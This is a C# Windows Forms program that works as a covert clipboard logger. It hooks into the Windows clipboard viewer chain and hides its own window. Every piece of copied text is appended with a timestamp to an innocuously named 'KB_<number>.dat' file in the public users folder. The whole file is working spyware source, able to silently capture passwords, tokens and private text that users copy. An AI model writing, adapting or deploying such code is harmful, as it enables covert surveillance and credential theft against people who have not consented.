using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class ClipboardViewerForm : Form
{
    private IntPtr _nextClipboardViewer;
    private static string clipboard_logger_path = "C:\\users\\public\\";

    public ClipboardViewerForm()
    {
        Console.WriteLine("Starting clipboard logger...");
        setup();
        _nextClipboardViewer = SetClipboardViewer(this.Handle);

        Console.WriteLine("Hiding logger");
        this.WindowState = FormWindowState.Minimized; //the form is minimized to hide logger
        this.VisibleChanged += ClipboardViewerForm_VisibleChanged; //visiblity of form is changed to hidden
    }

    private static void setup()
    {
        clipboard_logger_path = Path.Combine(clipboard_logger_path, Path.ChangeExtension("KB_" + Conversions.ToString(Environment.TickCount), "dat"));

        Console.WriteLine($"Setup logger path: {clipboard_logger_path}");
    }

    private void ClipboardViewerForm_VisibleChanged(object sender, EventArgs e)
    {
        this.Visible = false;
    }

    protected override void WndProc(ref Message m)
    {
        const int WM_DRAWCLIPBOARD = 0x308;
        const int WM_CHANGECBCHAIN = 0x30D;

        switch (m.Msg)
        {
            case WM_DRAWCLIPBOARD:
                // Clipboard contents have changed
                // Handle clipboard data here
                HandleClipboardChange();
                break;

            case WM_CHANGECBCHAIN:
                if (m.WParam == _nextClipboardViewer)
                {
                    // The next clipboard viewer has changed
                    _nextClipboardViewer = m.LParam;
                }
                else if (_nextClipboardViewer != IntPtr.Zero)
                {
                    // Pass the message to the next viewer in the chain
                    SendMessage(_nextClipboardViewer, m.Msg, m.WParam, m.LParam);
                }
                break;

            default:
                base.WndProc(ref m);
                break;
        }
    }

    private void HandleClipboardChange()
    {
        Console.Write("Getting clipboard data...:");

        try
        {
            if (Clipboard.ContainsText())
            {
                string text = Clipboard.GetText();
                if (text.Length > 128000)
                {
                    text = text.Substring(0, 128000); // Use Substring instead of Remove to keep the first 128,000 characters.
                }
                
                Log_clipboard(text);
            }
        }
        catch (Exception ex)
        {
            // Handle any exceptions that may occur while processing clipboard data.
            Console.WriteLine($"Error: {ex.Message}");
            return;
        }
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);

    [DllImport("user32.dll")]
    private static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);

    [DllImport("user32.dll")]
    private static extern void SendMessage(IntPtr hWnd, int msg, IntPtr wParam, IntPtr lParam);

    protected override void Dispose(bool disposing)
    {
        // Remove the clipboard viewer before disposing the form
        ChangeClipboardChain(this.Handle, _nextClipboardViewer);
        base.Dispose(disposing);
    }

    // Entry point
    [STAThread]
    public static void Main(string[] args)
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new ClipboardViewerForm());
    }

    private void Log_clipboard(string clipboard_text)
    {
        // Implement your processing logic for clipboard data here.
        // This method should handle the clipboard data as needed.
        //MessageBox.Show(clipboard_text);

        File.AppendAllText(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, clipboard_logger_path), $"Copied data at {DateTime.Now}: " + clipboard_text+"\n");

        Console.WriteLine(clipboard_text);
    }
}
